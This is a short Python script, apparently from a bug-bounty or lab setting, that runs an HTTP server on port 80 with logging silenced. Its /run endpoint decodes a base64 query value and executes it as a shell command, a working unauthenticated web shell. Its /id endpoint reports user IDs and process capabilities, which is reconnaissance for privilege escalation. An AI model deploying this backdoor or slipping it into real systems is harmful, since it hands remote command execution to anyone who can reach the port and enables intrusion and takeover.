import http.server, socketserver, subprocess, base64, os, json, urllib.parse

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)
        if u.path == "/health":
            body = b'{"ok":true}'
        elif u.path == "/run":
            cmd = base64.b64decode(q.get("c",[""])[0]).decode() if "c" in q else ""
            try:
                r = subprocess.run(["sh","-c",cmd], capture_output=True, text=True, timeout=120)
                out = r.stdout + r.stderr
            except Exception as e:
                out = "ERR:" + repr(e)
            body = out.encode()
        elif u.path == "/id":
            body = json.dumps({
                "uid": os.getuid(), "euid": os.geteuid(), "gid": os.getgid(),
                "caps_eff": open("/proc/self/status").read().split("CapEff:")[1].split()[0],
                "nnp": [l for l in open("/proc/self/status").read().splitlines() if "NoNewPrivs" in l],
            }).encode()
        else:
            body = b"bbh-app2"
        self.send_response(200)
        self.send_header("Content-Type","text/plain")
        self.send_header("Content-Length",str(len(body)))
        self.end_headers()
        self.wfile.write(body)

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("0.0.0.0",80), H) as s:
    s.serve_forever()
